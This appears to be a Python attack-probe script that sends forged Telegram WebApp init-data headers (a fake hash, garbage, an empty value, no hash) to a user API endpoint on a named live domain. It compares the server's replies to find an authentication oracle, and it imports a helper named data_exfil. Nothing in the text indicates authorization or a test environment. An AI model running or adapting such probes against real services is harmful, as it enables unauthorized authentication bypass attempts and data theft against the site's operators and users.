# -*- coding: utf-8 -*-
"""THE decisive re-test: X-Telegram-Init-Data (the REAL header K2 never knew).
If the backend PARSES it, invalid-vs-missing gives different answers = oracle."""
import sys, os, json, time, urllib.parse
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
from tools.data_exfil import data_extract

BASE = "https://duskyr.com/a316f209d2/api/user"

def probe(label, headers=None, note=""):
    r = json.loads(data_extract(BASE, headers=headers or {}))
    j = r.get("json") or {}
    print(f"[{label}] status={r['status']} body={json.dumps(j)[:180]}")
    return r

# 1. missing (baseline — K2's bare 401)
probe("missing")

# 2. well-formed but FAKE hash (does the parser fire?)
fake = "auth_date=1788667000&first_name=Vf&id=1028&username=vfuser&hash=deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
probe("X-Telegram-Init-Data fake", {"X-Telegram-Init-Data": fake})

# 3. garbage (non-URLENC form)
probe("X-Telegram-Init-Data garbage", {"X-Telegram-Init-Data": "garbage-not-urlencoded"})

# 4. EMPTY string
probe("X-Telegram-Init-Data empty", {"X-Telegram-Init-Data": ""})

# 5. well-formed, no hash field at all
nohash = "auth_date=1788667000&first_name=Vf&id=1028&username=vfuser"
probe("X-Telegram-Init-Data nohash", {"X-Telegram-Init-Data": nohash})
